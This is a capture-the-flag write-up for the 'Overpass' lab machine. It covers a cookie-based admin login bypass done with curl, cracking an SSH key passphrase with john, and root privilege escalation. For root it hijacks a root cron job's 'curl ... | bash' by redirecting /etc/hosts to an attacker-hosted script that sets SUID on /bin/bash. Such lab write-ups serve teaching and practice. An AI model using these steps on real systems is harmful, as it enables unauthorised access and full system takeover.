### WRITEUP FOR OVERPASS


## Hack the machine and get the flag in user.txt

Doing Basic Enumeration such as nmap and dirsearch
```
$ nmap -oN nmap_result <IP>
$ python3 dirsearch -u http://<IP> -e php -F -x 400
``` 
We found out that the webpage is open and has an /admin directory.Having a look at the /admin directory
, which has a basic login page, we find login.js, which has this function
```
async function login() {
....
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
We just need to put the cookie "SessionToken" as anything other than "Incorrect credentials", we can do this with curl
```
curl http://<IP>/admin --cookie="SessionToken"="a" -L
```
We are redirected to a webpage which has username and
we retrive a rsa-id key, which requires a passphrase.
We use ssh2john to decrypt the passphrase
```
$ /location/ssh2john id_rsa > john_hash
$ /location/john john_hash --wordlist='/location/rockyou.txt'
$ ssh -i id_rsa james@<IP>
```
and we get the passphrase as 'james13'. Using this we login and get the user flag.

## Escalate your privileges and get the flag in root.txt

For this part we need to have a look at the system using linpeas. So we need to transfer linpeas to victim machine. For this  we need the james's password.
We can Take a look at the source code overpass.go, we
find that it save the password at .overpass.
So the victim must have used this tool himself, thus looking at james/.overpass we find a ROT47 string, which gives james's password.
Now we can proceed with linpeas.
```
scp /location/linpeas.sh james@<IP>:/dev/shm
```
/dev/shm because it is world read-able and write-able.
having a look using linpeas we find
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
````
Now if we look at buildscript.sh we find this command
```
echo "$(date -R) Builds completed" >> /root/buildStatus
```
looking further with linpeas we found  /etc/hosts file as writeable by everyone. We can change the IP of overpass.thm as our own IP and execute our command.
So after changing the ip we make these directories
www/download/src/
and make buildscript.sh in src as
```
#! /bin/bash

chmod +s /bin/bash
```
now we host a python server at www directory
```
sudo python3 -m http.server 80
```
(If having issue with port 80 kill and restart using netstat -tulnp)
after hosting the server on our system. if we watch live the permission of /bin/bash file on victims pc
```
watch ls -l /bin/bash
```
we find that the permission changes from x to s
and thus we can get the permission of root directory
```
/bin/bash -p
```
And thus we have completed the room.